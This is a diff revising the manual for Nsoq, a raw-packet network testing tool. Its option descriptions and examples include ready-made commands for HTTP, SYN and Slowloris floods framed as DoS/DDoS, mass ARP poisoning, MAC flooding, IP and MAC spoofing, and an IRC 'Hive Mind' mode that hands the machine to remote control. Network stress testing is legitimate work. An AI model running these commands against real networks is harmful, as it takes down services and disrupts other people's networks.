@@ -1,5 +1,5 @@
                                    Nsoq
-              Network Security over a 'Q'rawler and RSOI Handler
+                     Network Security over a 'Q'rawler
           _________________________________________________________
 
                   Felipe Ecker (Khun) <khun@hexcodes.org> 
@@ -7,33 +7,25 @@
 
 
 
-
-DESCRIPTION:
-____________
-
-   Nsoq is a Network Security tool for raw packets manipulation that allows a
-   large number of options. Its primary purpose is analyze and test several 
-   scenarios of TCP/IP environments, such TCP/UDP packets and low levels 
+   Nsoq is a Network Security tool for packet manipulation that allows a
+   large number of options. Its primary purpose is to analyze and test several
+   scenarios of TCP/IP environments, such as TCP/UDP packets and low levels 
    ARP/RARP packets.
    Nsoq can send packets to any target type (like hostnames, IPs and MAC 
    address) like handling many fields/headers like: Source/Destination IP 
    address, Source/Destination MAC address, TCP flags, ICMP types, 
    TCP/UDP/ICMP packet size, payloads ARP/RARP, etc.
 
-   Nsoq is able to operate into the RSOI mode (Remote System over IRC), where 
+   Nsoq is able to operate in the RSOI mode (Remote System over IRC), where 
    the tool can surrender all control of machine resources to some specific 
-   IRC channel, also called Hive Mind option.
+   IRC channels (also called Hive Mind option).
 
-   Nsoq executes sistematically many types of network based attacks, like 
+   Nsoq executes systematically many types of network based attacks, like 
    packet attacks, MAC/IP Spoofing, DoS/DDoS attacks, ARP Poison, MAC Flooding
    and Web Stress Testing.
 
 
 ______________________________________________________________________________
-
-
-SYNOPSIS:
-_________
 
 
 nsoq
@@ -44,11 +36,6 @@ nsoq
    [-lC <-P port>] [-lU <-P port>] [-i interface] [-H destination_mac] 
    [-h source_mac] [-a ip_address] [-f number_packets] [-r ip-ip] 
    [-e ip_address] [lA] [-N irc_server] [-L irc_channel] [-G channel_password]
-
-
-
-   GENERAL SYNOPSIS
-   ________________
 
 
 
@@ -63,10 +50,10 @@ nsoq
    -x <packet size>    -->  Sets the packet size
    -t <ttl>            -->  TTL option
    -c                  -->  Continuous mode (1 second delay)
-   -F <delay>          -->  Flood mode (delay on microseconds)
-   -b                  -->  Super flood. More hard flood delay (CAUTION)
+   -F <delay>          -->  Flood mode (delay in microseconds)
+   -b                  -->  Aggressive flood (CAUTION)
    -z                  -->  Ignore replies
-   -n <number threads> -->  Number of threads
+   -n <number threads> -->  Threads number
    -D                  -->  Display the packet content (only received packets)
    -v                  -->  Print software version
    --help              -->  Print this screen and exit
@@ -74,13 +61,13 @@ nsoq
 
               <ICMP> Options:
 
-   -Ie                 -->  ICMP packet Echo Request (Ping)
-   -IE                 -->  ICMP packet Echo Reply
-   -Id                 -->  ICMP packet Information Request
-   -It                 -->  ICMP packet Timestamp Request
-   -Iq                 -->  ICMP packet Source Quench
-   -Im                 -->  ICMP packet Mask Request
-   -M <Mask>           -->  ICMP packet Mask Reply (Mask Form: -M 255.255.0.0)
+   -Ie                 -->  ICMP Echo Request (Ping) packet
+   -IE                 -->  ICMP Echo Reply packet
+   -Id                 -->  ICMP Information Request packet
+   -It                 -->  ICMP Timestamp Request packet
+   -Iq                 -->  ICMP Source Quench packet
+   -Im                 -->  ICMP Mask Request packets
+   -M <Mask>           -->  ICMP Mask Reply packet (Mask Form: -M 255.255.0.0)
    -lI                 -->  ICMP Listem Mode. Listen for incoming ICMP packets
    
 
@@ -112,7 +99,7 @@ nsoq
    -A                  -->  Sets ARP/RARP packet to REQUEST (Default REPLY)
    -a <ip address>     -->  Arp'ping (ping ARP mode - bypass ICMP filters)
    -f <number packets> -->  Mac flooding: Massive flood of spoofed ARP packets
-   -r <ip_addr-ip_addr>-->  ARP Cannon: Send ARP packets on a given range IP
+   -r <ip_addr-ip_addr>-->  ARP Cannon: Sends ARP packets on a given IP range
    -e <ip address>     -->  Exception IP: Excludes ip address from ARP Cannon
    -lE                 -->  ARP/RARP listen mode. Listen for ARP/RARP packets
    
@@ -121,27 +108,23 @@ nsoq
 
    -U                  -->  UDP stress test
    -C                  -->  TCP connections stress test
-   -W                  -->  HTTP (GET/KEEPALIVE) stress test
+   -W                  -->  HTTP (GET) stress test
    -B                  -->  ICMP stress test
    -S                  -->  TCP SYN stress test
    -K                  -->  TCP ACK stress test
-   -Y                  -->  SLOWLORIS based attack
-   [INFO] Use the -p <port> to set other than port 80 (default as port 80)
+   -Y                  -->  SLOWLORIS (GET/KEEPALIVE) based attack
+   [INFO] Use the -p <port> to set other than port 80 (default is port 80)
 
    
               <HIVE MIND - Mass Remote Control>
                 RSOI - Remote System over IRC
 
-   -N <irc server>     -->  IRC network to self remote control (RSOI mode)
-   -L <irc channel>    -->  IRC channel. Use: -L channel (without #)
-   -G <password>       -->  IRC channel's password (optional if required)
+   -N <irc server>     -->  IRC network to connect (RSOI mode)
+   -L <irc channel>    -->  IRC channel. Use: -L channel without # character
+   -G <password>       -->  IRC channel's password
    
    
    
-
-
-DETAILS:
-________
 
 
               <GLOBAL Options>
@@ -152,7 +135,7 @@ ________
    -s <source>
       Source host (hostname or IP address). If -s <host> option is not
       specified, the Nsoq assumes the IP address found by the first interface
-      defined in the system: (eth0, eth1, eth2, etc...) ordinarily.
+      defined on the system: (eth0, eth1, eth2, etc...) ordinarily.
    
    -p <port>
       Destination port (remote port).
@@ -161,20 +144,20 @@ ________
       Source port (local port).
 
    -i <interface>
-      Specifies the interface option. (Eg: -i eth0)
+      Sets the interface option (eg: -i eth0).
 
    -q <number packets>
        Number of packets to send.
 
    -x <packet size>
-      Sets the packet size. The package size can not be larger than 1470 bytes
+      Sets the packet size. The package size cannot be larger than 1470 bytes
       or larger than defined system MTU (eg: MTU=1500).
    
    -t <ttl>
       Sets the TTL field.
 
    -c
-      Continuous mode. Send packets without interruption with regular interval
+      Continuous mode. Sends packets without interruption with regular interval
       of 1 (one) second between the shoots.
 
    -F <delay>
@@ -182,23 +165,23 @@ ________
       The -F option cannot be used with -c or -b options.
 
    -b
-      Super flood. This option puts Nsoq optimized to send the largest number
-      of packets in a short amount of time [CAUTION].
+      Aggressive flood. This option puts Nsoq optimized to send the largest number
+      of packets in a short amount of time (CAUTION).
    
    -z
       Don't wait for replies. Ignore packet responses. 
 
    -n <number threads>
-      Number of threads to use on send option.
+      Number of threads to use on sending option.
 
    -D
-      Display the packet content on received packets (tcpdump style).
+      Display the packet content on receiving options (tcpdump style).
    
    -v 
       Print the version.
    
    --help
-      Print the initial help page with arguments.
+      Print the initial help page.
    
    ---------------------------------------------------------------------------
    
@@ -207,14 +190,14 @@ ________
              <ICMP Options>
 
    -Ie
-      Send an ICMP packet Type 8 (Echo Request). The target will respond with
-      an ICMP packet Type 0 (Echo Reply) if it is alive.
+      Sends an ICMP packet Type 8 (Echo Request). The target will respond with
+      an ICMP packet Type 0 (Echo Reply).
    
    -IE
-      Send an ICMP packet Type 0 (Echo Reply). 
+      Sends an ICMP packet Type 0 (Echo Reply). 
    
    -Id
-      Send an ICMP packet Type 15 (Information Request).
+      Sends an ICMP packet Type 15 (Information Request).
    
    -It
       Send ICMP packets Type 13 (Timestamp Request). 
@@ -223,16 +206,15 @@ ________
       Send ICMP packets Type 4 (Source Quench). 
    
    -Im
-      Send ICMP packets Type 17 (Mask Request). If target is configured to
+      Send ICMP packets Type 17 (Mask Request). If the target is configured to
       reply a request mask, a MaskReply pscket will be received with the Mask.
    
    -M <Mask>
       Send ICMP packets Type 18 (Mask Reply). The <Mask> argument is the mask
-      defined to packet. (Eg: -M 255.255.0.0).
+      defined for packet. (Eg: -M 255.255.0.0).
    
    -lI
-      ICMP Listen Mode. Listen for incoming ICMP packets. Any ICMP packet 
-      "unicast" will be captured.
+      ICMP Listen Mode. Listen for incoming ICMP packets.
    
    ---------------------------------------------------------------------------
    
@@ -241,38 +223,38 @@ ________
              <TCP Options>
 
    -Tc   
-      Simple TCP connection to target. The option -p port is required. This 
+      Does a simple TCP connection. The option -p port is required. This 
       option uses connect() routine for synchronization.
    
    -Ts
-      Send a TCP SYN packet (TCP packet with the SYN bit on).
+      Sends a TCP SYN packet (TCP packet with the SYN bit on).
    
    -Ta
-      Send a TCP ACK packet (TCP packet with the ACK bit on).
+      Sends a TCP ACK packet (TCP packet with the ACK bit on).
    
    -Tf
-      Send a TCP FINAL packet (TCP packet with the FIN bit on).
+      Sends a TCP FINAL packet (TCP packet with the FIN bit on).
    
    -Tr
-      Send a TCP RESET packet (TCP packet with the RST bit on).
+      Sends a TCP RESET packet (TCP packet with the RST bit on).
    
    -Tp
-      Send a TCP PUSH packet (TCP packet with the PSH bit on).
+      Sends a TCP PUSH packet (TCP packet with the PSH bit on).
    
    -Tx
-      Send a TCP packet XMAS (TCP packet with the FIN-PUSH-URG bits on).
+      Sends a TCP packet XMAS (TCP packet with the FIN-PUSH-URG bits on).
 
    -Tn
-      Send a NULL TCP packet (TCP packet with the NONE bits on. 
-      All tcp flags off).
+      Sends a NULL TCP packet (TCP packet with the NONE bits on. 
+      All tcp flags are off).
    
    -lT <-P port>
-      TCP Listen Mode. Listen for incoming TCP packets. This option need be
+      TCP Listen Mode. Listen for incoming TCP packets. This option is
        used with option "-P port". 
 
    -lC <-P port>
-      Listen for TCP connections. This option need to be used with option
-      "-P port". TCP listen mode uses accept() function for synchronization.
+      Listen for TCP connections. This option need is used with option
+      "-P port". The listener uses the accept() function for synchronization.
 
    ---------------------------------------------------------------------------
 
@@ -283,8 +265,8 @@ ________
       UDP mode.
 
    -lU <-P port>
-      UDP Listen Mode. Listen for incoming UDP packets. This option need be
-      used with the option "-P port". The UDP listen mode don't use a stream
+      UDP Listen mode. Listen for incoming UDP packets. This option is
+      used with the option "-P port". The UDP listener doesn't use a stream
       connection.
 
    ---------------------------------------------------------------------------
@@ -295,65 +277,66 @@ ________
 
    -H <destination mac>
       Destination MAC address. Option required for ARP packets. 
-      This option requires a destination IP address. So if "-d <destination>"
-      is not given, Nsoq will assumes by default a NULL value on this field
+      This option requires a destination IP address. If "-d <destination>"
+      is not given, Nsoq will assume by default a NULL value in this field
       header. Form: -H AA:DD:CC:22:11:AA.
 
    -h <source mac>
       Source MAC address. This option requires the source IP address. If 
       "-s <source>" is not given, Nsoq assumes by default the first IP
       address defined by the first interface found in the system (eth0, eth1,
-      eth2, etc). Form: -h AA:DD:CC:22:11:AA.
+      eth2, etc.). Form: -h AA:DD:CC:22:11:AA.
    
    -R
-      Defines the frame type like RARP packet. All ARP/RARP packets sent by
+      Defines the packet type to RARP packet. All ARP/RARP packets sent by
       Nsoq on the link layer are ARP by default. If "-R" is defined, then
-      Nsoq send packets type RARP instead.
+      Nsoq send RARP packets instead.
 
    -A
-      Defines the ARP/RARP frame type like REQUEST packet. The packets sent by
+      Defines the frame type to REQUEST packet. The packets sent by
       Nsoq on the link layer are REPLY by default. If "-A" is defined, then
       Nsoq sets the ARP/RARP packets to "REQUEST" type instead. 
    
    -a <ip address>
       Arping Mode. This option sends ARP REQUEST packets to a given IP 
-      address.The target receives the packet and returns an ARP REPLY packet.
-      This option is very useful for probing hosts that filter ICMP pings.
+      address.The target receives the packet and an ARP REPLY packet is 
+      returned.
+      This option is very useful for hosts that filtering ICMP pings.
    
    -f <number packets>
       Mac Flood (CAUTION !!).
       This option sends ARP REPLY packets with SOURCE MAC, DESTINATION MAC, 
       SOURCE IP ADDRESS and DESTINATION IP ADDRESS (randomly generated) on 
-      mode Super Food. If not specified the "-i <interface>" Nsoq takes the
+      Aggressive Food. If not specified the "-i <interface>" Nsoq takes the
       first valid interface found in the System. Eg usage:
                                 # nsoq -f 120000
       This option does a flooding by sending 120000 packets with random IP 
       addresses and random MAC addresses. This attack is also called 
       MAC FLOODING. Note: 
-      USE THIS OPTION VERY CAREFULLY. IT CAN OVERFLOW THE ROUTING TABLES OR AN
-      UNEXPECTED BEHAVIOR OF THE SWITCHS AND NEIGHBORING'S HOSTS ON NETWORK.
+      USE THIS OPTION VERY CAREFULLY. IT CAN OVERFLOW THE ROUTING TABLES OR
+      CAUSE UNEXPECTED BEHAVIOR ON SWITCHES AND NEIGHBORING'S HOSTS ON NETWORK.
 
    -r <ip_address-ip_address>
       ARP Cannon (CAUTION !!).
       This option sets Nsoq to send ARP REPLY packets to all defined IP 
-      addresses inside the range "ip_address-ip_address". This packets will
-      have destination MAC address defined to physical broadcast address 
+      addresses in the range "IP - IP". These packets will
+      have a destination MAC address defined to the physical broadcast address
       (FF:FF:FF:FF:FF:FF) and source MAC address randomly generated. The 
       option range (IP-IP) needs TO BE in the format shown below. Eg:   
                         # nsoq -r 10.1.1.1-10.1.1.240
       The above option does a flooding to destination physical broadcast 
-      FF:FF:FF:FF:FF:FF, saying to network enlace that all IP adresses in the
+      FF:FF:FF:FF:FF:FF, saying to network enlace that all IP addresses in the
       range "10.1.1.1 to 10.1.1.240" will have source MAC addresses randomly
       generated. This attack is also called MASSIVE ARP POISONING. This action
-      probally TAKE DOWN for moments all IP addresses defined in the range
-      argument.NOTE: USE THIS OPTION VERY CAREFULLY. 
+      probably TAKE DOWN for moments all IP addresses defined in the range
+      argument. NOTE: USE THIS OPTION VERY CAREFULLY. 
 
    -e <ip address>
-      This option exclude the "ip address" from option ARP CANNON (-r ip-ip)
+      This option excludes the "ip address" from option ARP CANNON (-r ip-ip)
       above defined. Eg: 
                   # nsoq -r 10.1.1.1-10.1.1.240 -e 10.1.1.10
       The above option will exclude the IP address "10.1.1.10" from 
-      ARP CANNON attack.
+      ARP CANNON attacks.
 
    -lA
       Listen for incoming ARP/RARP packets on link layer.
@@ -369,7 +352,7 @@ ________
    
    -C
       TCP connections attack. 
-      Does TCP connections to HTTP host (default: Port 80).
+      Do TCP connections to HTTP host (default: Port 80).
    
    -W
       WEB HTTP attack. 
@@ -390,7 +373,7 @@ ________
       Sends TCP ACK packets on flood mode to HTTP host (default: Port 80).
 
    -Y
-      SLOWLORIS attack.
+      SLOWLORIS HTTP attack.
       Makes partials HTTP requests (GET/KEEPALIVE) to host. (default Port 80).
       
 
@@ -405,13 +388,12 @@ ________
 
 
    -N <IRC server>
-      IRC network to connect. Option is required to put Nsoq on RSOI mode.
+      An IRC network to connect. This option is required to put Nsoq on RSOI mode.
 
    -L <IRC channel>
-      IRC #channel to connection. 
-      The channel must be defined without "#" character, where only the 
-      "IRC channel" must be filled. If this option is not given, then Nsoq
-      will join on #nsoq channel by default. 
+      IRC Channel. The channel must be defined without "#" character.
+      If this option is not given, then Nsoq will enter on '#nsoq' channel by
+      default.
    
    -G <password>
       IRC channel's password (if exists). If this option is not given, then
@@ -424,143 +406,138 @@ ________
 ______________________________________________________________________________
 
 EXAMPLES:
-_________
-
 
    # nsoq -d hexcodes -Ie
-      Send an ICMP packet (Echo Request) to host "hexcodes".
+      Sends an ICMP packet (Echo Request) to host "hexcodes".
 
    # nsoq -lI
       ICMP listen mode. Listen for ICMP packets like PINGs.
 
    # nsoq -It -d www.nsoq.org -c
-      Send ICMP packets (Timestamp Request) on continuous mode to server 
+      Sends ICMP packets (Timestamp Request) on continuous mode to server 
       "www.nsoq.org".
 
    # nsoq -s 10.1.100.100 -d www.nsoq.org -u -p 4140
-      Send an empty UDP packet with spoofed source ip "10.1.100.100" to host
+      Sends an empty UDP packet with spoofed source ip "10.1.100.100" to host
       "hexcodes" on port 4140.
 
    # nsoq -d www.nsoq.org -u -p 9000 -P 22000 -F 900 -q 20
-      Send only 20 UDP packets to server "www.nsoq.org" and to port 9000,
-      from source port 22000 with flood Delay of 900 miliseconds.
+      Sends only 20 UDP packets to server "www.nsoq.org" on port 9000,
+      from source port 22000 with flood Delay of 900 microseconds.
 
    # nsoq -d 201.1.0.13 -Ie -x 512 -t 50 -z
-      Sets Nsoq for send ICMP packets (Echo Request) with size of 512 bytes 
-      to host "201.1.0.13" with TTL 50. Don't wait for ICMP Echo ReplY.
+      Sets Nsoq for sending ICMP packets (Echo Request) with size of 512 bytes
+      to host "201.1.0.13" with TTL 50. Don't wait by ICMP Echo ReplY.
 
    # nsoq -lU -P 59
       Listen UDP packets on local port 59 (all addresses and loopback).
 
    # nsoq -d hexcodes -Ts -p 6000
-      Send a TCP SYN packet to host "hexcodes" on port 6000.
+      Sends a TCP SYN packet to host "hexcodes" on port 6000.
 
    # nsoq -lC -P 12345 > file.txt
-      Listen TCP connections on local port "12345", and write the received
-      data on file 'file.txt'.
+      Listen for TCP connections on local port "12345", and write the received
+      data to the file 'file.txt'.
 
    # nsoq -d hexcodes -p 12345 < /etc/hosts
       Connect to host 'hexcodes' reading the file '/etc/hosts. The file
-      content will be send over the TCP connection (netcat style).
+      content will be send over the TCP connection on port '12345'
+      (netcat style).
    
    # nsoq -lT -P 2134 -D
       Listen for TCP packets on local port "2134" and show the packet content.
 
    # nsoq -d www.nsoq.org -Tr -p 8080 -n 12 -b
-      Send TCP RST packets to server "www.nsoq.org" on port 8080, with 12
-      threads and super flood mode (HOT).
+      Sends TCP RST packets to server "www.nsoq.org" on port 8080, with 12
+      threads and aggressive flood mode (HOT).
 
    # nsoq -H FF:FF:FF:FF:FF:FF
-      Send an ARP REPLY packet to physical Broadcast FF:FF:FF:FF:FF:FF. (The
+      Sends an ARP REPLY packet to physical Broadcast FF:FF:FF:FF:FF:FF. (The
       source MAC address and the source IP address will be obtained locally 
       by the active interface. The destination IP address will be NULL).
 
    # nsoq -i eth2 -h 00:BB:AA:CC:BB:AA -H FF:FF:FF:FF:FF:FF -d 10.1.10.1 -A
-      Send an ARP REQUEST packet by the eth2 interface with source MAC 
+      Sends an ARP REQUEST packet by the eth2 interface with source MAC 
       00:BB:AA:CC:BB:AA, to destination physical Broadcast FF:FF:FF:FF:FF:FF,
       asking "Who ??" on the network have the IP address "10.1.10.1". The IP
       "10.1.10.1" (if alive) will respond with an ARP REPLY filled with its
       own MAC/IP address pair.
 
    # nsoq -s 10.2.2.100 -h 00:CC:AA:CC:BB:AA -H FF:FF:FF:FF:FF:FF
-      Send an ARP REPLY packet to destination physical Broadcast 
+      Sends an ARP REPLY packet to destination physical Broadcast 
       FF:FF:FF:FF:FF:FF saying that the source IP address "10.2.2.100" have
       now the MAC address 00:CC:AA:CC:BB:AA. (Caution: This option changes
       the ARP cache table. Possible ARP poisoning attack).
 
    # nsoq -a 10.1.50.100
-      Send an Arp'ing packet to Host "10.1.50.100". If the host hardware is
-      alive on network or LAN, by default an ARP REPLY will be returned.
+      Sends an Arp'ing packet to Host "10.1.50.100". If the host hardware is
+      alive on a network or LAN, by default an ARP REPLY will be returned.
       Otherwise, nothing happens. This option can be used to bypass ICMP
       filters (PING filters).
 
    # nsoq -f 250000
-      Send 250000 ARP REPLY packets (to physical broadcast) with the
+      Sends 250000 ARP REPLY packets (to physical broadcast) with the
       fields (SOURCE MAC, DESTINATION MAC, SOURCE IP and DESTINATION IP
       ADDRESSESS) randomly generated.
 
    # nsoq -lA -D
-      Listen for ARP/RARP packets. Does a listen action for all incoming
-      ARP/RARP packets on link layer, and show the packet content.
+      Listen for ARP/RARP packets. Listen to all incoming
+      ARP/RARP packets on link layer and show the packet content.
 
    # nsoq -N irc.quakenet.org -L Cybers
-      Sets the Nsoq to connect on IRC Server "irc.quakenet.org" on channel
-      #Cybers. This option puts Nsoq on the RSOI mode. So, the Nsoq 
-      will be NO AVAILABLE to be controled by user. Only the users on IRC
+      Sets the Nsoq to connect on IRC Server "irc.quakenet.org" on the channel
+      #Cybers. This option puts Nsoq on the RSOI mode. So, the tool
+      will be NO AVAILABLE to be controled by the user. Only the users on IRC
       server "irc.quakenet.org" channel #Cybers can do this.
 
    # nsoq -d 10.0.0.1 -W -n 40
       Sets the Nsoq to "WEB Stress Mode". This option puts Nsoq to send HTTP
-      requests (GET method) on super flooding mode to host "10.0.0.1" on port
-      80 (WEB HTTP) with 40 threads. This stress test attempts to exhaust the
-      services on port 80 (Web Server) and check the target's limit response.
-
-
+      requests (GET method) on aggressive flooding to host "10.0.0.1" on port
+      80 (default) with 40 threads. This stress test attempts to exhaust the
+      web service's resources and check the target's limit response.
 
 
 
 ______________________________________________________________________________
 
-DISCUSSIONS:
-____________
-
+MORE DISCUSSIONS:
 
                         #############################
                                  [WHITE SIDE]
                         #############################
 
 
-       Connections or packet manipulation to any port or destination
+       Connection or packet sending to any port or destination
       ________________________________________________________________
 
    Nsoq can connect or send packets to any destination or port. You can use 
-   this option to diagnose a port (listening or not) or check if a host is
-   responding as expected by sending many pre-builting packets. Eg:
+   this option to diagnose a port (listening or not) or check if the host is
+   responding as expected:
 
    # nsoq -d 10.0.0.2 -p 1024 -Tc
       Does a simple TCP connection to host 10.0.0.2 on port 1024.
 
    # nsoq -d 10.0.0.2 -p 20080 -u
-      Send an UDP packet to host 10.0.0.2 on port 20080.
+      Sends an UDP packet to host 10.0.0.2 on port 20080.
 
    # nsoq -d 10.0.0.2 -p 80 -Ts -c
-      Send TCP SYN packets to host 10.0.0.2 on port 80. If the port is open,
-      then a packet type TCP [ACK] will be returned. If this port is not 
-      opened, usually a TCP [RST] packet is returned (port scan).
+      Sends TCP SYN packets to host 10.0.0.2 on port 80. If the port is open,
+      then a TCP [ACK] packet will be returned. Otherwise, usually a TCP [RST]
+      packet is returned.
 
 
 
 
-   Listen on any port (TCP and UDP) or listen for ICMP and ARP/RARP packets
-   ________________________________________________________________________
+   Listen on any port (TCP and UDP) or listen for ICMP/ARP/RARP packets
+   ____________________________________________________________________
 
-   Nsoq can listen on any port (UDP and TCP) or listen for ICMP or ARP/RARP
-   packets. This option can be used to simulate a listen port supposedly given
-   by a software, and verify the connection requests or data incoming in this
-   same port. The Nsoq can does listen for incoming ICMP data like: pings,
-   replies, source quenchs, etc. 
-   The Nsoq also does listen on link layer level, capturing ARP/RARP packets
-   (Requests and Replies).
+   Nsoq listen on any port (UDP and TCP) or listen for ICMP/ARP/RARP
+   packets. This option is  used to simulate a listen port supposedly given
+   by a software, and verify the connection requests or data incoming.
+   The Nsoq also does a listen for incoming ICMP data like: pings,
+   replies, source quench, etc. 
+   The Nsoq can does a listen on the link layer level, capturing ARP/RARP 
+   packets (requests and replies).
 
    # nsoq -lC -P 20
       Sets nsoq to listen connections on local port 20 (TCP).
@@ -569,7 +546,7 @@ ____________
       Sets nsoq to listen on local port 1030 (UDP). 
 
    # nsoq -lT -P 16 -s 10.0.0.1
-      Sets nsoq to listen on local port 16 (TCP packets) only binded on the
+      Sets nsoq to listen on local port 16 (TCP packets) only bound on the
       address "10.0.0.1".
 
    # nsoq -lI -D
@@ -578,18 +555,18 @@ ____________
       pings.
 
    # nsoq -lA
-   Sets nsoq to listen data on the link layer. This option will will capture
+   Sets nsoq to listen data on the link layer. This option will capture
    incoming ARP and RARP packets. This is useful to display ARP/RARP REQUESTS
-   or REPLIES packets they cross the network.
+   or REPLIES packets they cross the local network (enlace layer).
 
 
 
-                    Able to run like a FTP Connection
-                   ___________________________________
+                    Running like a FTP Connection
+                   _______________________________
 
-   Nsoq is capable to run like FTP (over TCP Connection). It can listen at
-   a given port, so reading/writing data on a send/received connection (like
-   Netcat style). The data transfered can be BINARY or TEXT, whatever. Look:
+   Nsoq run like a FTP (over TCP Connection). It can listen on a given
+   port, so reading/writing data on a send/received connection (like
+   Netcat style). The transferred data types are: BINARY or TEXT.
    This mode is also compatible with Netcat modes (listeners and senders). 
 
                            (Server Side: On hexcodes host)
@@ -599,41 +576,38 @@ ____________
 
                            (Client Side: From any host)
    # cat /etc/hosts | nsoq -d hexcodes -Tc -p 2200
-      Does a connection to host 'hexcodes', and reads the file '/etc/hosts', 
-      to transfer the data content to remote host. The remote host 'hexcodes'
-      will write the transfered data content on the hosts.txt file.
+      Does a connection to host 'hexcodes' reading the file '/etc/hosts', 
+      and transferring to remote host. The remote host 'hexcodes'
+      will write the transferred data to the hosts.txt file.
 
 
    Another example:
 
                            (Server Side: On hexcodes host)
    # nsoq -lC -P 900 < files.zip
-     Listen on local port 900, and reads the binary content data of file
+     Listen on local port 900 (TCP) reading the 
      'files.zip' to transfer on the next accepted connection.
 
                            (Client Side: From any host)
-   # nsoq -d hexcodes -Tc -p 900 > new_files.zip
-     Sets the Nsoq to connect the host 'hexcodes' on remote port 900, and
-     read the binary incoming data content to write into the 'news_file.zip'
-     file.
+   # nsoq -d hexcodes -Tc -p 900 > new.zip
+     Sets the Nsoq to connect to the host 'hexcodes' on remote port 900, and
+     reading the binary incoming data and writing into the 'news.zip' file.
 
 
 
                            Arping - Alternative Ping
                            _________________________
 
-   Nsoq can send ARP REQUEST packets to certain destinations in order to
-   diagnose whether they are alive on the network. By default, the MAC
-   interface of the host that receives an ARP REQUEST packet must return an
-   ARP REPLY informing your MAC/IP pair. This option is very useful for
-   diagnosing whether a host is alive on the network when the host filter ICMP
-   packets and does  not accept pings ICMP. Therefore, the arping mode can be
-   used to bypass the firewall that filter ICMP packets.
+   Nsoq sends ARP REQUEST packets to destinations in order to
+   diagnose whether they are alive on the network. By default, the host that
+   receives an ARP REQUEST packet must return an ARP REPLY informing your MAC/IP
+   pair. This option is very useful for diagnosing whether a host is alive on 
+   the local network. If the host doesn't accept ICMP pings, so the arping mode
+   can be used to bypass a firewall that is filtering ICMP packets.
 
    # nsoq -a 10.0.0.100
-      Send an ARP'ING to host "10.0.0.100". If the host is alive on
-      network, then it will respond with an ARP REPLY packet.
-
+      Sends an ARP'ING to host "10.0.0.100". If the host is alive on
+      local network, then it will respond with an ARP REPLY packet.
 
 
 
@@ -645,58 +619,55 @@ ____________
                          #############################
 
 
-                    DOS and DDoS based attacks (over Web Stress)
-                    ____________________________________________
+                    DOS/DDoS based attacks (over Web Stress)
+                    ________________________________________
 
-   Since version 1.7, the nsoq enabled stress test of network based attacks.
-   These attacks are able to attempt to exhaust the services on port 80 
-   (Web Server) and verify the target's limit. If many clients of Nsoq run 
-   these routines at the same time and targeted to a single server, then this
-   server may fail in their services or become unavailable while the attack
-   lasts (DDoS). Eg:
+   Since 1.7 version, the nsoq/mptcp has enabled tests of network based 
+   attacks. These attacks attempt to exhaust the Web Services resources and
+   verify the target's limit.
+   If many Nsoq clients run these routines at the same time targeted
+   to a single server, then this server may fail in their services or become
+   unavailable while the attack lasts (Dos/DDoS):
 
    # nsoq -d www.nsoq.org -W -n 20
-     Sets the nsoq to "Stress Test mode", where the Nsoq will send many 
-     shootings on super flooding mode to server "www.nsoq.org" on port 80
-     (Default WEB Service), and with 20 threads. This option will give a great
-     overhead on target where it will try to exhaust the services WEB based. 
-     The threads usage also can to intensify the attack. The number of threads
-     above ~20 on -W option, from many sources and with a large link can
-     define a complete target's 'denial of services' (DoS).
+      Sets nsoq to "Stress Test". The tool will send many HTTP requests
+      (aggressive flood) to server "nsoq.org" on port 80 (default). and with 20
+      threads. This option tries cause a great overhead on target system trying
+      to exhaust the Web Service resources. More threads can intensify the
+      attack. The number of threads above ~20 on -W option (with a large link)
+      can execute a complete denial of services (DoS). 
 
 
 
 
+                             Mac/IP Spoofing
+                             _______________
 
-                             Mac and IP Spoofing
-                             ___________________
-
-   Nsoq can send packets with Source IP address and Source MAC address
-   spoofed. Nsoq can generate ICMP, TCP (syn, ack, rst, fin, push, null bits
-   and xmas bits on), UDP packets and ARP/RARP (Request and replies) with
-   source IP address filleds to any value. It can also set any value in the
-   source MAC address. Eg:
+   Nsoq sends packets with spoofed Source IP address and spoofed Source MAC
+   address. Nsoq can generates ICMP, TCP (syn, ack, rst, fin, push, null bits 
+   and xmas bits on), UDP packets and ARP/RARP (Request and replies) with this
+   address filled to any value:
 
    # nsoq -d 10.0.0.10 -p 890 -Ts -s 10.1.10.10
-      Send a TCP packet (bit syn on) to address "10.0.0.10" on port 890 and
+      Sends a TCP packet (bit syn on) to address "10.0.0.10" on port 890 and
       with source IP address defined (spoofed) to "10.1.10.10".
 
    # nsoq -s 0.0.0.0 -d 10.0.0.10 -p 9000 -u -c 
-      Send UDP packets to address "10.0.0.10" on port 9000 and with source
+      Sends UDP packets to address "10.0.0.10" on port 9000 and with source
       IP address defined to NULL "0.0.0.0".
 
    # nsoq -d 10.0.0.1 -Ie -z -F 1000 -s 10.255.0.255
-      Send ICMP packets (Echo Request - PING) to address "10.0.0.10" with
-      Source IP address defined to "10.255.0.255". This shoot don't wait by
+      Sends ICMP packets (Echo Request - PING) to address "10.0.0.10" with
+      Source IP address defined to "10.255.0.255". This shoot doesn't wait by
       the Echo Reply (-z option) and does a flooding with a delay time of 1000
       microseconds (-F option).
 
    # nsoq -H FF:FF:FF:FF:FF:FF -h 00:00:00:00:00:00
-      Send an ARP REPLY packet to physical BROADCAST (FF:FF:FF:FF:FF:FF)
-      saying that your source IP address have now MAC address
-      00:00:00:00:00:00. On this option, the sender host will stop receiving
-      and sending packets, and it will be isolated for a few seconds (Out of
-      comunication).
+      Sends an ARP REPLY packet to physical BROADCAST (FF:FF:FF:FF:FF:FF)
+      saying that its own IP address has now MAC address
+      00:00:00:00:00:00. In this option, the sender (you) will stop
+      receive or sending packets because will be isolated for a few seconds 
+      (out of communication).
 
 
 
@@ -704,33 +675,33 @@ ____________
                                 Massive Flood
                                 _____________
 
-   Nsoq can send any of its options (ICMP, TCP, UDP, and ARP-RARP) with
-   "Flood Delay" or "Super Flood" modes. The Flood Delay option sets the
-   interval of shoots in microseconds, and can send packets in a very low range
-   of time. The "Super Flood" is more hard because it ignores the packet reply
-   and its optimization has focused to sending a large number of packets per
-   second. In certain environments can cause a DoS (Denial of Service) and
-   cripple the host communication. These options need be used CAREFULLY, cause
-   they may cause unavailability of the target's services or the complete
-   unavailability of the network's target.
+   Nsoq sends any options (ICMP, TCP, UDP, and ARP-RARP) with 'Flood Delay' or
+   'Aggressive Flood'. The 'Flood Delay' option sets the interval of shoots
+   in microseconds, and send packets in a very low range time. The 
+   'Aggressive Flood' is harder because it ignores the packet reply and its 
+   optimization has focused to sending a large number of packets per second.
+   In certain environments, these options can realize a DoS or stop the host's
+   communications. Use these options CAREFULLY. Many aggressive floods can 
+   cause a complete unavailability of the target. 
 
